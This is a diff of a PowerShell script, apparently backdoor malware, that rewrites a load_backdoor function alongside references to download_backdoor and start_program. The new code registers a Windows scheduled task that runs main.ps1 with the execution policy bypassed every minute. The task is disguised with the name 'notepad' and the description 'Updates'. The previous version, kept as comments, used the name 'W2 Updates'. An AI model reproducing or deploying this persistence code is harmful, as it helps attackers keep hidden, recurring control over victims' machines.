@@ -73,21 +73,35 @@ function download_backdoor {
 
 
 
+# function load_backdoor {
+# 	# Creamos una tarea programada
+# 	$job = Start-Job { 
+# 		function load_program {
+# 			#$action = New-ScheduledTaskAction -Execute "Powershell.exe" -Argument $using:program_location + ".\" + $using:program_to_execute
+# 			$action = New-ScheduledTaskAction -Execute "Powershell.exe" -Argument -file $using:program_location + $using:program_to_execute
+# 			#$action = New-ScheduledTaskAction -Execute "Powershell.exe" -Argument -file "C:\script.ps1"
+
+# 			# $trigger =  New-ScheduledTaskTrigger -Daily -At 10am
+# 			$trigger = New-ScheduledTaskTrigger -Once -At 7am -RepetitionDuration  (New-TimeSpan -Days 1)  -RepetitionInterval  (New-TimeSpan -Minutes 1)
+
+# 			Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "W2 Updates" -Description "Updates"
+# 		} load_program 
+# 	}
+# 	Wait-Job $job
+# }
+
 function load_backdoor {
-	# Creamos una tarea programada
-	$job = Start-Job { 
-		function load_program {
-			#$action = New-ScheduledTaskAction -Execute "Powershell.exe" -Argument $using:program_location + ".\" + $using:program_to_execute
-			$action = New-ScheduledTaskAction -Execute "Powershell.exe" -Argument -file $using:program_location + $using:program_to_execute
-			#$action = New-ScheduledTaskAction -Execute "Powershell.exe" -Argument -file "C:\script.ps1"
+	# $action = New-ScheduledTaskAction -Execute powershell.exe -Argument "Set-Location 'C:\Program Files\z'; powershell –ExecutionPolicy Bypass .\main.ps1 ;"
 
-			# $trigger =  New-ScheduledTaskTrigger -Daily -At 10am
-			$trigger = New-ScheduledTaskTrigger -Once -At 7am -RepetitionDuration  (New-TimeSpan -Days 1)  -RepetitionInterval  (New-TimeSpan -Minutes 1)
+	# $program_location = $env:ProgramFiles+"\"+$program_name
+	$argument_to_execute = "Set-Location " + $program_location +"; powershell –ExecutionPolicy Bypass .\main.ps1 ;"
 
-			Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "W2 Updates" -Description "Updates"
-		} load_program 
-	}
-	Wait-Job $job
+
+	$action = New-ScheduledTaskAction -Execute powershell.exe -Argument $argument_to_execute
+	
+	$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionDuration  (New-TimeSpan -Days 1)  -RepetitionInterval  (New-TimeSpan -Minutes 1)
+	
+	Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "notepad" -Description "Updates"
 }
 
 function start_program{
